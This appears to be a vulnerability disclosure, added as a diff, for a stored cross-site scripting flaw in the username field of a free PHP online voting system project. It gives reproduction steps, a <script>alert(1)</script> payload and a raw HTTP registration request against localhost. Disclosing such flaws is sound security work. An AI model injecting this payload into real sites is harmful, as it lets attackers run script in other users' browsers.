@@ -1,0 +1,29 @@
+# Exploit Title: Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting
+# Date: 27-11-2020
+# Exploit Author: Sagar Banwa
+# Vendor Homepage: https://projectworlds.in/
+# Software Link: https://projectworlds.in/free-projects/php-projects/online-voting-system-project-in-php-2/
+# Tested on: Windows 10/Kali Linux
+
+Steps-To-Reproduce:
+
+1. Go to register 
+2. Add the payload in Username : <script>alert(1)</script>
+3. And complete the register 
+4. Login to the account 
+
+POST /vote/reg_action.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 593
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/vote/register.php
+Cookie: PHPSESSID=1sqkq0u1m2j47906htd45opcep
+Upgrade-Insecure-Requests: 1
+
+firstname=user1&lastname=user2&username=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&password=testtest&g-recaptcha-response=03AGdBq24TB5LilE4y9YCZx4I_XrKLBs2ftYrVEJ70_vhpDG-FXCKhzfB-EmAD-NnhKRSZ8_A88_ZNB4nXnwMBs8cU1Qgrqzs8Yme0Bmral8WRK1umGikJeDzliuigIKgZ6Q2Me9zGS-ecZyrujgF4tKSlMs3K_KNgVhEhlAsslrfBe7jQg40aG3PdMCXTTOst4Lt91vswl1G_dmYjrLEh7AfLJS7XYgXrEt4Pfau_mJ3KzE_hf-MxbpTI9_NkCLanUiW8-VI1t3uopUbSE9xH53X1cUExoe_dGpwnkygZw_4yEDp-iBYA73wql5ow1W43OIn5pmSBz_Sdv1VbfAqbFMEIXXJx4o5D_TLiVKLDQCj2Vy-fRmohlpYwV76NR5Iu2D693FKCs3KODRNSaitpOevSfcYh3h05vCGuPSO1fCu4c3v1daiIdFKPwDvfKS_Lm8jgoFK4kfnZ&submit=Next
